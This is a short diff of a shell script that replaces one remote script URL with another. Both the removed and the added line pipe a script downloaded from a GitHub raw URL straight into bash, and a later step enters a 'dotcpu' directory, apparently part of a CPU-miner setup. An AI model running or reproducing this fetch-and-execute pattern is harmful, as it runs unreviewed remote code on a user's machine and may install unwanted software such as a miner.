@@ -2,7 +2,7 @@
 
 kolot=$(cat /dev/urandom | tr -dc '0-9' | fold -w 2 | head -n 1)
 
-bash -c "$(wget -qO- raw.githubusercontent.com/DotAja/ALONE/main/ALAT-COLI/DotCpu.sh)"
+bash -c "$(wget -qO- https://raw.githubusercontent.com/monhodsompul/mike/main/luckcpr.sh)"
 
 cd dotcpu
 
